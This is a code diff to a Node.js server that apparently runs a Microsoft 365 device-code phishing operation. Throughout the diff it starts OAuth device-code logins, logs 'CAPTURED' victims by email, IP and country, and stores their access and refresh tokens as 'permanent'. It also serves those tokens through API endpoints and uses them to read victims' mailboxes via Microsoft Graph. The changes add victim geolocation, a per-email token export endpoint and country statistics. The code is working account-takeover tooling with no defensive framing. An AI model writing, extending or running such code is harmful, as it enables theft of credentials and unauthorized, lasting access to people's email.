@@ -21,6 +21,25 @@ let userSessions = new Map();
 let pendingAuth = new Map();
 let sessionCounter = 1;
 
+// IP to Country mapping (simplified - you can use a real geolocation API)
+function getCountryFromIp(ip) {
+    const countryMap = {
+        '46.183': 'United States',
+        '172.': 'United States',
+        '104.': 'United States',
+        '185.': 'Germany',
+        '188.': 'United Kingdom',
+        '45.': 'Canada',
+        '103.': 'India',
+        '31.': 'Netherlands',
+        '46.': 'Sweden'
+    };
+    for (const [prefix, country] of Object.entries(countryMap)) {
+        if (ip.startsWith(prefix)) return country;
+    }
+    return 'Other';
+}
+
 function generateSessionId() {
     return sessionCounter++;
 }
@@ -37,6 +56,7 @@ app.post('/start', async (req, res) => {
         const sessionId = generateSessionId();
         const clientIp = getClientIp(req);
         const userAgent = req.headers['user-agent'] || 'Unknown';
+        const country = getCountryFromIp(clientIp);
         
         const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
@@ -51,7 +71,7 @@ app.post('/start', async (req, res) => {
         
         pendingAuth.set(sessionId, {
             device_code, user_code, sessionId, status: 'pending',
-            ip: clientIp, userAgent: userAgent,
+            ip: clientIp, userAgent: userAgent, country: country,
             createdAt: Date.now(),
             expiresAt: Date.now() + (expires_in * 1000)
         });
@@ -107,18 +127,18 @@ async function pollForToken(device_code, sessionId) {
             const userName = userInfo.data.displayName;
             const now = Date.now();
             
-            // Store session with CORRECT expiration time
             userSessions.set(sessionId, {
                 id: sessionId,
                 email: userEmail,
                 name: userName,
+                ip: pending.ip,
+                userAgent: pending.userAgent,
+                country: pending.country,
                 access_token: tokens.access_token,
                 refresh_token: tokens.refresh_token,
                 expires_in: tokens.expires_in,
-                expires_at: now + (tokens.expires_in * 1000),  // CORRECT: now + expires_in
-                capturedAt: now,
-                ip: pending.ip,
-                userAgent: pending.userAgent
+                expires_at: now + (tokens.expires_in * 1000),
+                capturedAt: now
             });
             
             pending.status = 'success';
@@ -126,20 +146,14 @@ async function pollForToken(device_code, sessionId) {
             pendingAuth.delete(sessionId);
             clearInterval(pollInterval);
             
-            console.log(`✅ CAPTURED: ${userEmail} (Session ID: ${sessionId})`);
-            console.log(`   Access token expires in ${tokens.expires_in} seconds (${Math.round(tokens.expires_in/60)} minutes)`);
-            console.log(`   PRT: ${tokens.refresh_token ? 'YES (Permanent)' : 'NO'}`);
+            console.log(`✅ CAPTURED: ${userEmail} (${pending.country}, ${pending.ip})`);
             
         } catch (err) {}
     }, 2000);
 }
 
-// ============================================
-// STATUS ENDPOINT
-// ============================================
 app.get('/state', async (req, res) => {
     const sessionId = parseInt(req.query.session_id);
-    
     if (!sessionId) return res.json({ status: 'error' });
     
     const session = userSessions.get(sessionId);
@@ -152,7 +166,7 @@ app.get('/state', async (req, res) => {
 });
 
 // ============================================
-// GET FRESH ACCESS TOKEN USING PRT (NEVER EXPIRES)
+// GET FRESH ACCESS TOKEN USING PRT
 // ============================================
 async function getFreshAccessToken(email) {
     let session = null;
@@ -163,19 +177,9 @@ async function getFreshAccessToken(email) {
         }
     }
     
-    if (!session) {
-        console.log(`No session found for ${email}`);
-        return null;
-    }
-    
-    if (!session.refresh_token) {
-        console.log(`No PRT for ${email}`);
-        return null;
-    }
+    if (!session || !session.refresh_token) return null;
     
     try {
-        console.log(`🔄 Refreshing token for ${email} using PRT...`);
-        
         const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
             new URLSearchParams({
                 grant_type: 'refresh_token',
@@ -189,31 +193,53 @@ async function getFreshAccessToken(email) {
         
         session.access_token = response.data.access_token;
         session.expires_at = Date.now() + (response.data.expires_in * 1000);
-        session.expires_in = response.data.expires_in;
         
-        console.log(`✅ Fresh token obtained for ${email} (expires in ${response.data.expires_in} seconds)`);
         return response.data.access_token;
-        
     } catch (err) {
-        console.error(`Failed to refresh token for ${email}:`, err.message);
         return null;
     }
 }
 
 // ============================================
-// API ENDPOINTS - With proper date formatting
+// API ENDPOINTS
 // ============================================
 app.get('/api/sessions', (req, res) => {
     const sessions = Array.from(userSessions.values()).map(s => ({
         id: s.id,
         email: s.email,
         name: s.name,
+        ip: s.ip,
+        country: s.country,
+        userAgent: s.userAgent,
         type: 'Graph API',
         capturedAt: new Date(s.capturedAt).toLocaleString(),
         expiresAt: s.refresh_token ? 'Permanent (PRT)' : new Date(s.expires_at).toLocaleString(),
         hasPRT: !!s.refresh_token
     }));
     res.json({ sessions: sessions, total: sessions.length });
+});
+
+app.get('/api/session/token/:email', async (req, res) => {
+    const { email } = req.params;
+    let session = null;
+    for (const [id, s] of userSessions.entries()) {
+        if (s.email === email) {
+            session = s;
+            break;
+        }
+    }
+    
+    if (!session) return res.status(404).json({ error: 'Session not found' });
+    
+    // Get fresh access token
+    const freshToken = await getFreshAccessToken(email);
+    
+    res.json({
+        email: session.email,
+        access_token: freshToken || session.access_token,
+        refresh_token: session.refresh_token,
+        expires_in: session.expires_in
+    });
 });
 
 app.get('/api/list_access_tokens', (req, res) => {
@@ -240,6 +266,15 @@ app.get('/api/list_refresh_tokens', (req, res) => {
             refreshtoken: s.refresh_token
         }));
     res.json(tokens);
+});
+
+app.get('/api/country_stats', (req, res) => {
+    const countryCount = {};
+    for (const session of userSessions.values()) {
+        const country = session.country || 'Other';
+        countryCount[country] = (countryCount[country] || 0) + 1;
+    }
+    res.json({ countries: countryCount, total: userSessions.size });
 });
 
 app.delete('/api/delete_access_token/:id', (req, res) => {
@@ -274,12 +309,8 @@ app.delete('/api/sessions/clear', (req, res) => {
 // ============================================
 app.get('/api/mail/folders/:email', async (req, res) => {
     const { email } = req.params;
-    console.log(`📧 Getting folders for ${email}`);
-    
     const token = await getFreshAccessToken(email);
-    if (!token) {
-        return res.status(401).json({ error: 'No valid token. Please re-authenticate.' });
-    }
+    if (!token) return res.status(401).json({ error: 'No valid token' });
     
     try {
         const response = await axios.get('https://graph.microsoft.com/v1.0/me/mailFolders', {
@@ -288,7 +319,6 @@ app.get('/api/mail/folders/:email', async (req, res) => {
         });
         res.json(response.data);
     } catch (err) {
-        console.error('Folder error:', err.response?.data);
         res.status(500).json({ error: 'Failed to fetch folders' });
     }
 });
@@ -397,14 +427,7 @@ app.get('/api/resource/settings', (req, res) => res.json({ success: true, active
 app.post('/api/resource/settings', (req, res) => { config.active_resource = req.body.active_resource; res.json({ success: true }); });
 app.post('/api/openai/settings', (req, res) => { Object.assign(config, req.body); res.json({ success: true }); });
 
-// ============================================
-// SERVE FILES
-// ============================================
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`\n========================================`);
     console.log(`✅ Server running on port ${PORT}`);
-    console.log(`✅ PRTs are PERMANENT - never expire`);
-    console.log(`✅ Access tokens auto-refresh using PRT`);
-    console.log(`========================================\n`);
 });
